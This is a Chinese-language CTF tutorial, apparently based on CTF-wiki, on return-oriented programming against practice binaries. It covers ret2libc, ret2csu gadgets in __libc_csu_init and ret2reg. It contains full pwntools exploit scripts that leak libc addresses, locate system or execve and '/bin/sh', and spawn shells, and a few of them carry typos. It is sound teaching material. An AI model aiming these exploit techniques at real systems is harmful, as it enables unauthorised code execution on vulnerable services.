<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x08048720 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure>

<p>那么我们直接返回该处，执行system函数。payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line"></span><br><span class="line">bin_bash &#x3D; 0x08048720</span><br><span class="line">system_addr &#x3D; 0x08048460</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; *112, system_addr, &#39;bbbb&#39; , bin_bash])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.plt:08048490 _system</span><br><span class="line">.plt:08048460 _gets           </span><br><span class="line">.bss:0804A080 buf2 </span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>payload1 堆栈平衡(在调用完gets之后要把调用的参数给pop出来，提升栈堆(保持esp和ebp的值不变)再对system进行调用)如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, pop_ebx_addr, buf2_addr, system_addr , &#39;aaaa&#39; , buf])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>payload2 :</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201227101548054.png" alt="image-20201227101548054" style="zoom:50%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, system_addr, buf2_addr, buf2_addr])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc3&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
<li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
</ul>
<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
<ul>
<li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li>
</ul>
<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
<p>手动寻找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;libc.blukat.me&#x2F;</span><br><span class="line"></span><br><span class="line">$ .&#x2F;find __libc_start_main d90</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.27-3ubuntu1_i386.deb (id libc6_2.27-3ubuntu1_i386)</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6-i386_2.27-3ubuntu1_amd64.deb (id libc6-i386_2.27-3ubuntu1_amd64)</span><br><span class="line"></span><br><span class="line">$ .&#x2F;dump libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">offset___libc_start_main_ret &#x3D; 0x18e81</span><br><span class="line">offset_system &#x3D; 0x0003cd10</span><br><span class="line">offset_dup2 &#x3D; 0x000e6110</span><br><span class="line">offset_read &#x3D; 0x000e5620</span><br><span class="line">offset_write &#x3D; 0x000e56f0</span><br><span class="line">offset_str_bin_sh &#x3D; 0x17b8cf</span><br></pre></td></tr></table></figure>



<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line"></span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[&#39;__libc_start_main&#39;]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line"></span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;__libc_start_main&#39;, libc_start_main_addr)</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
<li><p>train.cs.nctu.edu.tw: ret2libc</p>
</li>
<li><p>train.cs.nctu.edu.tw: rop</p>
</li>
<li><p>2013-PlaidCTF-ropasaurusrex</p>
</li>
<li><p>Defcon 2015 Qualifier: R0Pbaby</p>
</li>
</ul>
<h1 id="Intermediate-ROP"><a href="#Intermediate-ROP" class="headerlink" title="Intermediate ROP"></a>Intermediate ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>这里我们可以利用以下几点</p>
<ul>
<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>
<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>
<li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>
</ul>
<h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>这里我们以一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec level5   </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;level5&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序为 64 位，开启了堆栈不可执行保护。</p>
<p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本利用思路如下</p>
<ul>
<li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li>
<li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li>
</ul>
<p>exp 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">debug &#x3D; True</span><br><span class="line"></span><br><span class="line">context(log_level &#x3D; &#39;debug&#39;, arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;level5&quot;)</span><br><span class="line">    level5&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line">else:</span><br><span class="line">    link &#x3D; &quot;x.x.x.x:xx&quot;</span><br><span class="line">    ip, port &#x3D; map(lambda x:x.strip(), link.split(&#39;:&#39;))</span><br><span class="line">    sh &#x3D; remote(ip, port)</span><br><span class="line">    elf&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line"></span><br><span class="line">write_got &#x3D; level5.got[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; level5.got[&#39;read&#39;]</span><br><span class="line">main_addr &#x3D; level5.symbols[&#39;main&#39;]</span><br><span class="line">bss_base &#x3D; level5.bss()</span><br><span class="line">csu_front_addr &#x3D; 0x0000000000400600</span><br><span class="line">csu_end_addr &#x3D; 0x000000000040061A</span><br><span class="line">fakeebp &#x3D; &#39;b&#39; * 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">    # pop rbx,rbp,r12,r13,r14,r15</span><br><span class="line">    # rbx should be 0,</span><br><span class="line">    # rbp should be 1,enable not to jump</span><br><span class="line">    # r12 should be the function we want to call</span><br><span class="line">    # rdi&#x3D;edi&#x3D;r15d</span><br><span class="line">    # rsi&#x3D;r14</span><br><span class="line">    # rdx&#x3D;r13</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x80 + fakeebp</span><br><span class="line">    payload +&#x3D; p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload +&#x3D; p64(csu_front_addr)</span><br><span class="line">    payload +&#x3D; &#39;a&#39; * 0x38</span><br><span class="line">    payload +&#x3D; p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="line">## write(1,write_got,8)</span><br><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br><span class="line">#write(1, writ_got_addr, 8)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u64(sh.recv(8))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;, write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">execve_addr &#x3D; libc_base + libc.dump(&#39;execve&#39;)</span><br><span class="line">log.success(&#39;execve_addr &#39; + hex(execve_addr))</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## read(0,bss_base,16)</span><br><span class="line">## read execve_addr and &#x2F;bin&#x2F;sh\x00</span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">csu(0, 1, read_got, 16, bss_base, 0, main_addr)</span><br><span class="line">#read(0,bss_base,16)</span><br><span class="line">sh.send(p64(execve_addr) + &#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## execve(bss_base+8)</span><br><span class="line">csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)</span><br><span class="line">#execve(&#x2F;bin&#x2F;sh,0,0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>gadget构造的payload要在末尾加上0x38个填充字符</p>
<p>gadget1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>

<p>gadget2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>rsp  8 *  (8 -1)  </p>
<p>ps: add rsp,8  + pop * 6 + ret -call</p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
<h4 id="改进-1-提前控制-RBX-与-RBP"><a href="#改进-1-提前控制-RBX-与-RBP" class="headerlink" title="改进 1  提前控制 RBX 与 RBP"></a>改进 1  <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#1-rbx-rbp">提前控制 RBX 与 RBP</a></h4><p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p>
<h4 id="改进-2-多次利用"><a href="#改进-2-多次利用" class="headerlink" title="改进 2 多次利用"></a>改进 2 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#2-">多次利用</a></h4><p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p>
<ul>
<li>漏洞可以被多次触发</li>
<li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li>
</ul>
<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
<h4 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#gadget">gadget</a></h4><p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure>

<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<p>需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p>
<ul>
<li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li>
<li>利用中间部分的代码控制了 rdx，rsi，edi。</li>
</ul>
<p>而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，<strong>可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>

<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul>
<li>2016 XDCTF pwn100</li>
<li>2016 华山杯 SU_PWN</li>
</ul>
<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>1.查看栈溢出返回时哪个寄存器指向缓冲区空间</p>
<p>2.查找对应的call寄存器活着jmp寄存器指令，将EIP设置为该指令地址</p>
<p>3.将寄存器所指向的空间上注入shellcode</p>
</blockquote>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>分析和调试汇编，查看溢出函数返回时哪个寄存器指向缓冲区地址</li>
<li>向寄存器指向的缓冲区中注入shellcode</li>
<li>查找call 该寄存器或者jmp 该寄存器指令，并将该指令地址覆盖ret</li>
</ul>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>在函数ret之前，将所有寄存器全部复位，清0，以避免此类漏洞</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>此类漏洞常见于strcpy字符串拷贝函数中</p>
